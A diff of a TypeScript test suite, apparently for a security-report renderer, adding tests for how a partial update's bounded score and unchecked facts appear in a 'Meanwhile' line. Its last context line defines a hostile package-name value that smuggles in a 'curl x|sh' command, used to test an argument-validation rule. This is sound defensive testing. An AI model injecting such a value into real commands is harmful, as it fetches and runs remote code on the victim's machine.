@@ -241,6 +241,35 @@ describe("the Security row", () => {
   });
 });
 
+describe("the Meanwhile line of a partial update with facts it could not check", () => {
+  test("names them after the score it bounds", () => {
+    const { finding, run, metadata } = modelCase("partial");
+    if (finding.security.status !== "vulnerable" || finding.security.partial === null)
+      throw new Error("partial has a partial update");
+    finding.security.partial.if_applied = { at_most: true, total: 12, verdict: "medium", assumes: [] };
+    finding.security.partial.unverified = [
+      { kind: "flag", id: "old-promise", reason: "undated" },
+      { kind: "flag", id: "capped", reason: "no_release_data" },
+    ];
+
+    expect(plain(securityBlock(finding, run, metadata).meanwhile ?? [])).toContain(
+      "(at most 12, medium after it; not checked: old-promise, capped)",
+    );
+  });
+
+  test("adds no not-checked clause when it checked every fact", () => {
+    const { finding, run, metadata } = modelCase("partial");
+    if (finding.security.status !== "vulnerable" || finding.security.partial === null)
+      throw new Error("partial has a partial update");
+    finding.security.partial.if_applied = { at_most: false, total: 12, verdict: "medium", assumes: [] };
+    finding.security.partial.unverified = [];
+
+    const line = plain(securityBlock(finding, run, metadata).meanwhile ?? []);
+    expect(line).toContain("(12, medium after it)");
+    expect(line).not.toContain("not checked");
+  });
+});
+
 describe("a command only for a name that passes the argument rule (SPEC §5.6)", () => {
   const HOSTILE = "a/b;curl x|sh;#";
 
